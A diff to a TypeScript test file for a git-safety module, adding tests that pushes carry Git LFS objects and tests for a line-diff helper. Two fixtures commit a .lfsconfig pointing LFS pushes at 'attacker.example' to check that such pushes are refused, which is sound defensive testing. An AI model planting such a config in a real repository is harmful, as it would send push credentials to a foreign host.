@@ -1,5 +1,5 @@
 import { afterEach, beforeEach, describe, expect, test } from "bun:test";
-import { chmodSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, renameSync, rmSync, writeFileSync } from "node:fs";
+import { chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, renameSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 import { runCmd } from "../src/exec.ts";
@@ -11,6 +11,7 @@ import {
  gitConfigSnapshot,
  gitCredential,
  GitSafetyError,
+ linesAddedSince,
  NODE_BRANCH,
  safeGit,
  utf8Name,
@@ -652,4 +653,154 @@ describe("gitConfigSnapshot: benign git-lfs and push config (2026-10-10)", () =>
    await expect(assertGitUntouched(canonical, before)).rejects.toThrow(GitSafetyError);
   });
  }
+});
+
+describe("vettedPush: a branch's LFS objects reach origin though hooks are off (seelite #1037)", () => {
+ const credential = gitCredential("acme/widgets", "placeholder");
+ const lfsObject = (bare: string, oid: string) => join(bare, "lfs", "objects", oid.slice(0, 2), oid.slice(2, 4), oid);
+ const branchRef = (origin: string, branch: string) => git(["for-each-ref", "--format=%(refname)", `refs/heads/${branch}`], origin);
+
+ const lfsBranch = async (nodeId: string, extra: Record<string, string> = {}) => {
+  for (const [key, value] of [
+   ["filter.lfs.clean", "git-lfs clean -- %f"],
+   ["filter.lfs.smudge", "git-lfs smudge -- %f"],
+   ["filter.lfs.process", "git-lfs filter-process"],
+   ["filter.lfs.required", "true"],
+  ]) await config(key, value);
+  const worktree = await bootstrapWorktree(canonical, nodeId, "x", credential);
+  const files = { ".gitattributes": "*.bin filter=lfs diff=lfs merge=lfs -text\n", "model.bin": "a study binary\n".repeat(64), ...extra };
+  for (const [name, text] of Object.entries(files)) writeFileSync(join(worktree, name), text);
+  await git(["add", ...Object.keys(files)], worktree);
+  await git(["commit", "-m", "add a study binary"], worktree);
+  const pointer = await git(["cat-file", "-p", "HEAD:model.bin"], worktree);
+  return { worktree, origin: await git(["remote", "get-url", "origin"]), oid: /^oid sha256:([0-9a-f]{64})$/m.exec(pointer)?.[1] ?? "" };
+ };
+
+ test("an LFS file committed on a node branch has its object on origin after the push", async () => {
+  const { worktree, origin, oid } = await lfsBranch("87");
+  expect(oid).toHaveLength(64);
+  await vettedPush({ worktree, canonical, branch: "node/87-x", credential, configSnapshot: gitConfigSnapshot(canonical) });
+  expect(await branchRef(origin, "node/87-x")).toBe("refs/heads/node/87-x");
+  expect(readFileSync(lfsObject(origin, oid), "utf8")).toBe("a study binary\n".repeat(64));
+ });
+
+ test("a committed .lfsconfig refuses the push: it can point the credentialed LFS push at another host", async () => {
+  const { worktree, origin, oid } = await lfsBranch("89", { ".lfsconfig": "[lfs]\n\turl = https://attacker.example/lfs\n" });
+  await expect(
+   vettedPush({ worktree, canonical, branch: "node/89-x", credential, configSnapshot: gitConfigSnapshot(canonical) }),
+  ).rejects.toThrow(/\.lfsconfig/);
+  expect(await branchRef(origin, "node/89-x")).toBe("");
+  expect(existsSync(lfsObject(origin, oid))).toBe(false);
+ });
+
+ test("a .lfsconfig committed and then deleted from the worktree still refuses the push", async () => {
+  const { worktree, origin } = await lfsBranch("90", { ".lfsconfig": "[lfs]\n\turl = https://attacker.example/lfs\n" });
+  rmSync(join(worktree, ".lfsconfig"));
+  await expect(
+   vettedPush({ worktree, canonical, branch: "node/90-x", credential, configSnapshot: gitConfigSnapshot(canonical) }),
+  ).rejects.toThrow(/\.lfsconfig/);
+  expect(await branchRef(origin, "node/90-x")).toBe("");
+ });
+
+ test("git-lfs sees the push credential as git's auth header", async () => {
+  const { worktree } = await lfsBranch("91");
+  const seen = join(dir, "lfs-saw-header");
+  const recordingLfs = join(dir, "recording-lfs");
+  mkdirSync(recordingLfs);
+  writeFileSync(join(recordingLfs, "git-lfs"), `#!/bin/sh\ngit config --get-all http.extraheader > "${seen}"\nexit 0\n`);
+  chmodSync(join(recordingLfs, "git-lfs"), 0o755);
+  const path = process.env.PATH;
+  process.env.PATH = `${recordingLfs}:${path}`;
+  try {
+   await vettedPush({ worktree, canonical, branch: "node/91-x", credential, configSnapshot: gitConfigSnapshot(canonical) });
+  } finally {
+   process.env.PATH = path;
+  }
+  expect(readFileSync(seen, "utf8").trim()).toBe(
+   `AUTHORIZATION: basic ${Buffer.from("placeholder:x-oauth-basic").toString("base64")}`,
+  );
+ });
+
+ test("a branch with no LFS rule pushes without calling git-lfs", async () => {
+  const origin = await git(["remote", "get-url", "origin"]);
+  const worktree = await bootstrapWorktree(canonical, "88", "x", credential);
+  const failingLfs = join(dir, "failing-lfs");
+  mkdirSync(failingLfs);
+  writeFileSync(join(failingLfs, "git-lfs"), "#!/bin/sh\nexit 97\n");
+  chmodSync(join(failingLfs, "git-lfs"), 0o755);
+  const path = process.env.PATH;
+  process.env.PATH = `${failingLfs}:${path}`;
+  try {
+   await vettedPush({ worktree, canonical, branch: "node/88-x", credential, configSnapshot: gitConfigSnapshot(canonical) });
+  } finally {
+   process.env.PATH = path;
+  }
+  expect(await branchRef(origin, "node/88-x")).toBe("refs/heads/node/88-x");
+ });
+
+ test("a credentialed lfs push names its remote and ref, as a push does", () => {
+  expect(() => assertNamedRefs(["lfs", "push", "origin", "HEAD"])).not.toThrow();
+  expect(() => assertNamedRefs(["lfs", "push", "origin"])).toThrow(GitSafetyError);
+  expect(() => assertNamedRefs(["lfs", "fetch", "origin", "HEAD"])).toThrow(GitSafetyError);
+ });
+});
+
+describe("ranger#357: linesAddedSince", () => {
+ let dir: string;
+ const git = async (args: string[]) => {
+  const r = await runCmd("git", args, { cwd: dir, env: { ...process.env, ...GIT_ENV } });
+  expect(r.code, `git ${args.join(" ")}: ${r.stderr}`).toBe(0);
+  return r.stdout.trim();
+ };
+ beforeEach(async () => {
+  dir = mkdtempSync(join(tmpdir(), "ranger-lines-added-"));
+  await git(["init", "-q", "-b", "main"]);
+  writeFileSync(join(dir, "plain.ts"), "one\ntwo\nthree\n");
+  await git(["add", "-A"]);
+  await git(["commit", "-q", "-m", "base"]);
+ });
+ afterEach(() => rmSync(dir, { recursive: true, force: true }));
+
+ test("lines are read per named path: non-ASCII, a space, a tab, and an added line starting `++ `", async () => {
+  const from = await git(["rev-parse", "HEAD"]);
+  writeFileSync(join(dir, "café.ts"), "a\nb\n");
+  writeFileSync(join(dir, "with space.ts"), "x\n");
+  writeFileSync(join(dir, "tab\there.ts"), "y\n");
+  writeFileSync(join(dir, "plain.ts"), "one\n++ x\ntwo\nthree\nfour\n");
+  await git(["add", "-A"]);
+  await git(["commit", "-q", "-m", "delta"]);
+  const added = await linesAddedSince(dir, from, await git(["rev-parse", "HEAD"]), ["café.ts", "with space.ts", "tab\there.ts", "plain.ts", "untouched.ts"]);
+  expect(added === null ? null : Object.fromEntries([...added].map(([p, l]) => [p, [...l]]))).toEqual({
+   "café.ts": [1, 2], "with space.ts": [1], "tab\there.ts": [1], "plain.ts": [2, 5], "untouched.ts": [],
+  });
+ });
+
+ test("a repo that forces color still yields its hunks", async () => {
+  await git(["config", "color.ui", "always"]);
+  await git(["config", "color.diff", "always"]);
+  const from = await git(["rev-parse", "HEAD"]);
+  writeFileSync(join(dir, "plain.ts"), "one\nadded\ntwo\nthree\n");
+  await git(["add", "-A"]);
+  await git(["commit", "-q", "-m", "delta"]);
+  const added = await linesAddedSince(dir, from, await git(["rev-parse", "HEAD"]), ["plain.ts"]);
+  expect(added === null ? null : [...(added.get("plain.ts") ?? [])]).toEqual([2]);
+ });
+
+ test("a pathspec-looking path is taken literally", async () => {
+  const from = await git(["rev-parse", "HEAD"]);
+  writeFileSync(join(dir, "plain.ts"), "one\nadded\ntwo\nthree\n");
+  await git(["add", "-A"]);
+  await git(["commit", "-q", "-m", "delta"]);
+  const added = await linesAddedSince(dir, from, await git(["rev-parse", "HEAD"]), ["*.ts"]);
+  expect(added?.get("*.ts")?.size).toBe(0);
+ });
+
+ test("a clean sha that is not an ancestor of the head fails closed", async () => {
+  const base = await git(["rev-parse", "HEAD"]);
+  await git(["commit", "-q", "--allow-empty", "-m", "side"]);
+  const side = await git(["rev-parse", "HEAD"]);
+  await git(["reset", "-q", "--hard", base]);
+  await git(["commit", "-q", "--allow-empty", "-m", "rewritten"]);
+  expect(await linesAddedSince(dir, side, await git(["rev-parse", "HEAD"]), ["plain.ts"])).toBeNull();
+ });
 });
